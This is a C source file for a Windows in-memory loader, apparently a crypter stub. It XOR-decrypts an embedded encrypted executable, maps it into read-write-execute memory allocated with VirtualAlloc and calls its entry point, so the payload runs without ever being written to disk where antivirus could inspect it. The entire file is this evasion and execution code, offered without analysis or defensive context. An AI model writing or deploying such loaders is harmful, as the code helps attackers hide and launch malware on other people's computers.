#include "payload.h"
#include "key.h"
#include <stdlib.h>

#include <stdio.h>

#include "utils.h"
#include "winnt.h"

#include <windows.h>
#include <processthreadsapi.h>
#include <errhandlingapi.h>
#include <memoryapi.h>

void decrypt_inmem(const uint8_t *key, const size_t key_len, uint8_t *payload, const size_t payload_len) {
    size_t km=key_len-1;
    for(size_t p=0; p<payload_len; ++p) {
        payload[p]^=key[p&km];
    }
}

void print_last_error(const char *add_msg) {
    fprintf(stderr, "%s", add_msg);
    DWORD errorcode = GetLastError();

    char *msg=NULL;
    if(FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER|FORMAT_MESSAGE_FROM_SYSTEM, NULL, errorcode, 0, (char *) &msg, 0, NULL) == 0 || msg == NULL) {
        fprintf(stderr, "Could not get error message for errorcode %ld\n", errorcode);
        return;
    }

    fprintf(stderr, "[%ld] %s\n", errorcode, msg);

    free(msg);
}

int main(int ac, char *as[]) {
    decrypt_inmem(key, key_len, payload, payload_len);

    pe_t *pe=pe_new(payload, payload_len);
    if(pe == NULL) {
        return 1;
    }

    const size_t needed_size = pe_get_len(pe);

    uint8_t *mem = VirtualAlloc(NULL, needed_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if(mem == NULL) {
        print_last_error("Failed to allocate mem\n");
        goto error;
    }

    if(!pe_load_into_memory(pe, mem, needed_size)) {
        print_last_error("Failed to load pe into mem\n");
        goto error;
    }

    void (*entrypoint)() = (void (*)()) (mem + pe->info.optional_header.opt_header64.AddressOfEntryPoint);

    pe_free(pe);
    pe=NULL;
    
    entrypoint();

    return 0;

error:
    pe_free(pe);
    VirtualFree(mem, needed_size, MEM_RELEASE);
    return 1;
}
